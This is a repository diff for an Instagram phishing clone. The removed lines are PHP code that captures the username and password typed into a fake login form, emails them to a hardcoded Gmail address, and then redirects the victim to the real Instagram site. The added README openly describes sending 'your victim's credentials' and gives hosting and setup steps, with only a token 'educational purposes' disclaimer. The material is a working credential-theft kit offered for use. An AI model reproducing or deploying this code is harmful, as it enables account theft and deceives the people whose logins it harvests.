@@ -1,30 +1,32 @@
-# instagram-7
-<?php
-
-//varible setting
-$username = $_REQUEST['u_name'];  // fetch username
- $passcode = $_REQUEST['pass'];  // fetch password
- $subject = "Someone Login ! Insta Dummy page";
- $to ="karansinghhhh006@gmail.com";
- 
- $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
- 
+# Insta-login
+Instagram login page clone which send your victim's credentials through email.</br>
+The webpage works on both **mobile** web browsers & **desktop**.<br/>
 
 
-// check input fields
-if (empty($username)|| empty($passcode)){ // name or message
-echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
-    window.history.go(-1);
-    </script>";
-}
-else 
-{ 
-    mail($to,$subject,$txt); // send an email 
-    echo"<script type='text/javascript'>alert('Sorry ! unable to login ');
-     // Simulate an HTTP redirect:
-    window.location.replace('http://www.instagram.com');
-    </script>";
-}
+❗ **Do not forget to not use it for malicious purposes, it's only for educational purposes.**<br/>
+❗ **You are solely responsible for your actions, that's obviously not me.**<br/>
+</br>
+</br>
 
+## 🚀 Getting started
 
-?>
+* Get the source [code](https://github.com/Abhijeetbyte/insta-login/archive/refs/heads/main.zip)
+
+* Extract the zip and uploade the website on your hosting server
+  - Here i am using **000webhost.com** it's free and allow sending emails too.
+
+![img](images/email-check.png)
+
+* Change receiving email address</br>
+
+  - ![img](images/email-php_LI.jpg)
+</br>
+
+### Webpage 
+![Webpage](images/webpage-preview.png)
+
+</br>
+
+* As soon as someone enter **username** & **password** and click on **Log In** button, you will receive an email</br>
+
+  - ![img](images/received-email.png)
